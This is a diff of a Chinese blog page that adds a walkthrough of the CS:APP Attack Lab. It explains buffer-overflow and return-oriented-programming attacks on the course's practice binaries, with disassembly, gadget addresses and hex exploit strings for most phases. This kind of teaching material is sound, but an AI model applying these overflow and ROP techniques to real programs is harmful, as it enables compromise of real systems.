@@ -6,20 +6,30 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>深入理解计算机系统 | Hexo</title>
+  <title>深入理解计算机系统:lab3 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="深入理解计算机系统 一直想要拜读这部CS:APP,现在终于抽出了一段时间来好好阅读，在这里主要记录CS:APP中的实验，以便日后复习。实验的链接在这里：cs:app">
+  <meta name="description" content="lab3 Attack lab 在这一实验中我们会通过两种方法来完成对目标文件的攻击：   缓冲区溢出攻击：1-3小题 ROP 攻击：4，5小题">
 <meta name="keywords" content="cs:app">
 <meta property="og:type" content="article">
-<meta property="og:title" content="深入理解计算机系统">
-<meta property="og:url" content="http://yoursite.com/2019/03/16/csapp/index.html">
+<meta property="og:title" content="深入理解计算机系统:lab3">
+<meta property="og:url" content="http://yoursite.com/2019/03/16/lab3/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="深入理解计算机系统 一直想要拜读这部CS:APP,现在终于抽出了一段时间来好好阅读，在这里主要记录CS:APP中的实验，以便日后复习。实验的链接在这里：cs:app">
+<meta property="og:description" content="lab3 Attack lab 在这一实验中我们会通过两种方法来完成对目标文件的攻击：   缓冲区溢出攻击：1-3小题 ROP 攻击：4，5小题">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-03-16T16:11:55.450Z">
+<meta property="og:image" content="http://tu.027cgb.com/618037/lab3result3.png">
+<meta property="og:image" content="http://tu.027cgb.com/618037/mov.png">
+<meta property="og:image" content="http://tu.027cgb.com/618037/BC.png">
+<meta property="og:image" content="http://tu.027cgb.com/618037/D.png">
+<meta property="og:image" content="http://tu.027cgb.com/618037/lab3result4.png">
+<meta property="og:image" content="http://tu.027cgb.com/618037/final1.png">
+<meta property="og:image" content="http://tu.027cgb.com/618037/final.png">
+<meta property="og:image" content="http://tu.027cgb.com/618037/final2.png">
+<meta property="og:image" content="http://tu.027cgb.com/618037/finallab.png">
+<meta property="og:updated_time" content="2019-03-20T06:01:22.236Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="深入理解计算机系统">
-<meta name="twitter:description" content="深入理解计算机系统 一直想要拜读这部CS:APP,现在终于抽出了一段时间来好好阅读，在这里主要记录CS:APP中的实验，以便日后复习。实验的链接在这里：cs:app">
+<meta name="twitter:title" content="深入理解计算机系统:lab3">
+<meta name="twitter:description" content="lab3 Attack lab 在这一实验中我们会通过两种方法来完成对目标文件的攻击：   缓冲区溢出攻击：1-3小题 ROP 攻击：4，5小题">
+<meta name="twitter:image" content="http://tu.027cgb.com/618037/lab3result3.png">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -159,35 +169,192 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-csapp" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-lab3" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      深入理解计算机系统
+      深入理解计算机系统:lab3
     </h1>
   
 
         
-        <a href="/2019/03/16/csapp/" class="archive-article-date">
-  	<time datetime="2019-03-15T16:55:29.224Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-16</time>
+        <a href="/2019/03/16/lab3/" class="archive-article-date">
+  	<time datetime="2019-03-16T08:28:20.680Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-16</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="深入理解计算机系统"><a href="#深入理解计算机系统" class="headerlink" title="深入理解计算机系统"></a>深入理解计算机系统</h1><hr>
-<p>一直想要拜读这部CS:APP,现在终于抽出了一段时间来好好阅读，在这里主要记录CS:APP中的实验，以便日后复习。<br>实验的链接在这里：<a href="http://csapp.cs.cmu.edu/3e/labs.html" target="_blank" rel="noopener">cs:app</a><a id="more"></a></p>
+        <h1 id="lab3-Attack-lab"><a href="#lab3-Attack-lab" class="headerlink" title="lab3 Attack lab"></a>lab3 Attack lab</h1><hr>
+<p>在这一实验中我们会通过两种方法来完成对目标文件的攻击：</p>
 <blockquote>
 <ul>
-<li>lab1 : Data lab</li>
-<li>lab2 : Bomb lab</li>
-<li>lab3 : <a href="https://adamlixi.github.io/2019/03/16/lab3/" target="_blank" rel="noopener">Attack lab</a></li>
+<li>缓冲区溢出攻击：1-3小题</li>
+<li>ROP 攻击：4，5小题<a id="more"></a>
+</li>
 </ul>
 </blockquote>
+<h2 id="缓冲区溢出攻击"><a href="#缓冲区溢出攻击" class="headerlink" title="缓冲区溢出攻击"></a>缓冲区溢出攻击</h2><p>首先，先讲讲缓冲区溢出攻击的原理</p>
+<p>众所周知，当程序调用函数（方法）时，会先将当前PC所指的下一条命令压入堆栈中，然后将PC置为目标函数的地址，之后程序运行跳转至目标函数。<br>当程序从函数中运行结束时，会调用ret将堆栈中之前压入的地址弹出到PC中，从而使得程序返回到主程序中。</p>
+<p>缓冲区溢出攻击便是应用了函数调用这个特点，将PC的返回位置做出更改，从而将程序跳转到我们的攻击程序中。</p>
+<hr>
+<h3 id="Part1"><a href="#Part1" class="headerlink" title="Part1"></a>Part1</h3><p>这道题目要求我们注入的代码可以调用另外一个目标函数<br>先来看看ctarget函数的流程：</p>
+<pre><code>void test() {
+    int val;
+    val = getbuf();
+    printf(&quot;NO explit. Getbuf returned 0x%x\n&quot;, val);
+}
+</code></pre><p>我们需要使用这个函数来调用下列的目标函数：</p>
+<pre><code>void touch1() {
+    vlevel = 1;
+    printf(&quot;Touch!: You called touch1()\n&quot;);
+    validate(1);
+    exit(0);
+}
+</code></pre><p>我们的代码通过getbuf()来传入，先来看看getbuf()</p>
+<pre><code>000000000040181c &lt;getbuf&gt;:
+    40181c:    48 83 ec 28          sub    $0x28,%rsp
+401820: 48 89 e7             mov    %rsp,%rdi
+401823: e8 88 02 00 00       callq  401ab0 &lt;Gets&gt;
+401828: b8 01 00 00 00       mov    $0x1,%eax
+    40182d:    48 83 c4 28          add    $0x28,%rsp
+    401831:    c3                   retq   
+    401832:    90                   nop
+    401833:    90                   nop
+</code></pre><p>可以找到getbuf堆栈段大小为40字，所以我们的注入代码长度超过40字就会发生溢出。</p>
+<p>所以在第41字处插入touch3()的地址，就可以首先跳转了。<br>二进制代码如下（注意是小端输入）:</p>
+<pre><code>00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+34 18 40 00
+</code></pre><p>记得要使用hex2raw将写的二进制(其实是16进制)的代码翻译成01代码，注入便可成功啦。</p>
+<h3 id="Part2"><a href="#Part2" class="headerlink" title="Part2"></a>Part2</h3><p>这一道题目题目提高了一些难度，要求我们不仅要调用目标函数，还要向目标函数传递我们的cookie值。</p>
+<p>所以这次我们要注入的不仅是一个地址了，还需要注入一段代码，这段代码很简单，即将我们的cookie值传递到%rdi中。<br>汇编描述如下：</p>
+<pre><code>mov cookies的值,%rdx
+push touch3地址
+ret
+</code></pre><p>我们把这两句话放在堆栈顶，第一次ret的地址即为这两句话(栈顶)，第二次ret地址为touch3。</p>
+<p>下面我们需要确定栈顶的地址为多少。</p>
+<p>使用gdb工具来调试，观察%rsp的值，便可得到。</p>
+<p>得到如下机器码：</p>
+<pre><code>48 c7 c7 ee 4f 37 45 68 
+60 18 40 00 c3 00 00 00
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+d8 f2 60 55
+</code></pre><h3 id="Part3"><a href="#Part3" class="headerlink" title="Part3"></a>Part3</h3><p>这道题目的源代码如下：</p>
+<pre><code>int hexmatch(unsigned val, char *sval){
+    char cbuf[110];
+    char *s = cbuf + random() % 100;
+    sprintf(s, &quot;%.8x&quot;, val);
+    return strncmp(sval, s, 9) == 0;
+}
+void touch3(char *sval){
+    vlevel = 3;
+    if (hexmatch(cookie, sval)){
+        printf(&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;, sval);
+        validate(3);
+    } else {
+        printf(&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;, sval);
+        fail(3);
+    }
+    exit(0);
+}
+</code></pre><p>由题目可知这一次我们需要想向touch3()函数传递一个指针值，且这个指针所指的值是一个asc码，根据asc码可以翻译得到我们的cookie值，但注意到touch3函数还会掉用另一个函数，这会导致rsp减小，很有可能破坏掉我们在栈中所存储的cookie的asc码值。</p>
+<p>所以，我们的cookie是不可以放在ret指令的上面的（不可以放在地址减小方向），而是放在ret指令的下方（地址增大的方向）。</p>
+<p>所以我们的注入代码的逻辑应该是这样的：<br>1.注入堆栈，使得堆栈溢出，修改返回指令，使程序运行到我们的注入代码段。<br>2.将我们的cookie的地址传入%rdi，调用touch3()。（注意cookie的地址比ret的地址要大）<br>3.运行touch3函数<br>翻译成二进制文件，如下：</p>
+<pre><code>48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 00 00 00
+35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00
+35 39 62 39 39 37 66 61
+</code></pre><p>运行结果如下:<br><img src="http://tu.027cgb.com/618037/lab3result3.png"></p>
+<hr>
+<h2 id="ROP攻击"><a href="#ROP攻击" class="headerlink" title="ROP攻击"></a>ROP攻击</h2><p>我们可以发现程序运行时如果没有合适的堆栈保护机制会使得攻击变得异常的轻松。</p>
+<p>面对这种情况rtarget做出的对堆栈的保护机制：<br>1.每次为程序分配堆栈段的地址是任意的，无法提前检查出。<br>2.PC无法执行堆栈段中的程序，如果运行便会报错，并终止程序的运行。</p>
+<p>面对这种情况，我们对程序代码进行重构，引导PC在已有程序中跳转，以将PC引导到我们的目标攻击文件中去。</p>
+<p>我们应注意二进制文件中，是否含有对我们有利的或有帮助的信息，并注意记录下来他们的地址，关注如下的命令是否存在：</p>
+<p><img src="http://tu.027cgb.com/618037/mov.png" alt="mov"><br><img src="http://tu.027cgb.com/618037/BC.png" alt="BC"><br><img src="http://tu.027cgb.com/618037/D.png" alt="D"><br>还有90——为空指令<br>c3——返回指令</p>
+<h3 id="Part4"><a href="#Part4" class="headerlink" title="Part4"></a>Part4</h3><p>这道题目要求我们将rtarget引导入touch2(cookie)函数，主函数所调用的函数如下：</p>
+<pre><code>0000000000401994 &lt;start_farm&gt;:
+  401994:    b8 01 00 00 00           mov    $0x1,%eax
+  401999:    c3                       retq   
+
+000000000040199a &lt;getval_142&gt;:
+  40199a:    b8 fb 78 90 90           mov    $0x909078fb,%eax
+  40199f:    c3                       retq   
+
+00000000004019a0 &lt;addval_273&gt;:
+  4019a0:    8d 87 48 89 c7 c3        lea    -0x3c3876b8(%rdi),%eax
+  4019a6:    c3                       retq   
+
+00000000004019a7 &lt;addval_219&gt;:
+  4019a7:    8d 87 51 73 58 90        lea    -0x6fa78caf(%rdi),%eax
+  4019ad:    c3                       retq   
+
+00000000004019ae &lt;setval_237&gt;:
+  4019ae:    c7 07 48 89 c7 c7        movl   $0xc7c78948,(%rdi)
+  4019b4:    c3                       retq   
+
+00000000004019b5 &lt;setval_424&gt;:
+  4019b5:    c7 07 54 c2 58 92        movl   $0x9258c254,(%rdi)
+  4019bb:    c3                       retq   
+
+00000000004019bc &lt;setval_470&gt;:
+  4019bc:    c7 07 63 48 8d c7        movl   $0xc78d4863,(%rdi)
+  4019c2:    c3                       retq   
+
+00000000004019c3 &lt;setval_426&gt;:
+  4019c3:    c7 07 48 89 c7 90        movl   $0x90c78948,(%rdi)
+  4019c9:    c3                       retq   
+
+00000000004019ca &lt;getval_280&gt;:
+  4019ca:    b8 29 58 90 c3           mov    $0xc3905829,%eax
+  4019cf:    c3                       retq   
+
+00000000004019d0 &lt;mid_farm&gt;:
+  4019d0:    b8 01 00 00 00           mov    $0x1,%eax
+  4019d5:    c3                       retq
+</code></pre><p>分析代码时，我们要着重注意左侧的二进制代码，并从中提取出对我们有用的信息。</p>
+<p>ok我们现在先来分析一下我们需要什么代码：</p>
+<p>1.通过堆栈溢出保存我们的cookie<br>2.将cookie传入rdi中<br>3.调用touch2()函数</p>
+<p>如何才能保存cookie值呢？<br>我们的cookie值保存在堆栈中，所以要将参数传到寄存器中需要popq指令，还需要将代码返回所以还需要ret指令，所以我们要寻找二进制为5_ c3 的字段，<br>注意地址4019a7：和他的下一行含有58 90 c3 ，意思为：</p>
+<pre><code>popq %rax 
+nop 
+ret 
+</code></pre><p>将堆栈pop道rax中，并且暂停一次，之后返回，符合我们的要求，所以记录他的起始地址：4019ab</p>
+<p>观察地址4019a0:含有48 89 c7 c3，可以翻译为：</p>
+<pre><code>movq %rax,%rdi
+ret
+</code></pre><p>所以应该记录该地址4019a2<br>最后查找touch2函数的地址：4017ec<br>最后在注入的代码中加入cookie<br>所以最后结果如下：</p>
+<pre><code>00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+ab 19 40 00 00 00 00 00
+fa 97 b9 59 00 00 00 00
+a2 19 40 00 00 00 00 00
+ec 17 40 00 00 00 00 00
+</code></pre><p>执行后的结果：<br><img src="http://tu.027cgb.com/618037/lab3result4.png" alt="result"></p>
+<h3 id="Part5"><a href="#Part5" class="headerlink" title="Part5"></a>Part5</h3><p>到了最后一道题目，这道题目要求和第三题一样————向touch3()传入一个cookie地址，且该地址的cookie为asc码表示。</p>
+<p>所以解决这道题目的思路和之前的也一样，首先需要确定堆栈的栈顶地址，然后通过cookie与其栈顶的相对距离确定cookie的地址。</p>
+<p>所以这一次我们应该在整个rtarget文件中寻找我们所需要的指令。</p>
+<p>由于指令非常多，所以在查找指令时需要灵活，首先我们需要有一条主方向，然后根据给出的指令灵活变换我们的破防思路，但一定要靠近我们制定的方向。</p>
+<p>1.首先我们需要将%rsp的值保存起来，这样便确定了栈顶的位置。<br>2.通过popq将我们事先存储在栈中的相对位移值弹出。<br>3.根据栈顶和位移确定cookie的地址，将其传入touch3。</p>
+<p>以上便为主要方向。下面来进行解题。</p>
+<p>在面对各种复杂的二进制指令时，我们需要注意我们需要的指令代码在哪里，并把他记录下来。根据相关性简单拼凑在一起，我主要搜索mov，popq指令，以及lea，并简单拼凑，结果如下：<br><img src="http://tu.027cgb.com/618037/final1.png" alt="firstresult"></p>
+<p>接下来对提出的代码进行整理，理出我们的主要路线：<br><img src="http://tu.027cgb.com/618037/final.png" alt="second"><br>我的思路是：<br>1.将rsp的值传入rax。<br>2.将rax的值传入rdi。<br>3.弹出我们的cookie地址，将其存入rsi，注意：0这里有一条多余的pop指令才会到ret指令，所以我们需要在下一条目标指令之前输入一个没有用的数字，以保护下一个地址。<br>4.将相对位移与栈顶地址相加得到cookie地址。<br>5.将cookie地址传入rdi中。<br>6.调用touch3函数。</p>
+<p>所以得到的二进制代码如下：</p>
+<p><img src="http://tu.027cgb.com/618037/final2.png" alt="final"></p>
+<p>通过编译为二进制文件后传入rtarget，完成！</p>
+<p><img src="http://tu.027cgb.com/618037/finallab.png" alt="final"></p>
 
       
 
@@ -278,7 +445,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/03/16/csapp/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/03/16/lab3/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -292,15 +459,20 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/03/16/lab3/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2019/03/20/并发编程之美/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          深入理解计算机系统:lab3
+          并发编程之美:基础部分
         
       </div>
     </a>
   
+  
+    <a href="/2019/03/16/csapp/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">深入理解计算机系统</div>
+      <i class="icon-circle-right"></i>
+    </a>
   
 </nav>
 
